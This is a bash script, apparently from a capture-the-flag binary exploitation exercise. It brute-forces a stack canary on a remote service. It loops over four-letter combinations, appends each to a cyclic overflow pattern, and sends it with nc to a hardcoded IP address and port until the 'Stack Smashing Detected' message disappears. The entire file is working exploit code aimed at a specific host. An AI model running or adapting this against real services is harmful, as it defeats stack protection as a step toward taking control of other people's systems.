#!/bin/bash

# Replace the following values with your actual server information
SERVER_IP="144.24.156.180"
SERVER_PORT=8888

# Iterate through all 4-letter combinations with both uppercase and lowercase letters
for STR1 in {s..z} {S..Z}; do
    for STR2 in {a..z} {A..Z}; do
        for STR3 in {a..z} {A..Z}; do
            for STR4 in {a..z} {A..Z}; do
                # Construct the command with the current values of STR1, STR2, STR3, and STR4
                COMMAND="echo -e '68\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa${STR1}${STR2}${STR3}${STR4}' | nc ${SERVER_IP} ${SERVER_PORT}"

                # Execute the command and filter the output
                OUTPUT=$(eval "${COMMAND}" 2>&1 | grep "Stack Smashing Detected")
                # Check if the output contains "Stack Smashing Detected"
                if [[ -z "${OUTPUT}" ]]; then
                    # Print the current command to the console
                    echo "YES! ${STR1}${STR2}${STR3}${STR4}"
                    # Print the filtered output
                    echo "${OUTPUT}"

                    # Add a separator for better readability
                    echo "----------------------------------"
                    exit 0  # Exit the script if a match is found
                else
                    echo "${STR1}${STR2}${STR3}${STR4}: x"
                fi
            done
        done
    done   
done
# Print a message if no match is found
echo "No match found."
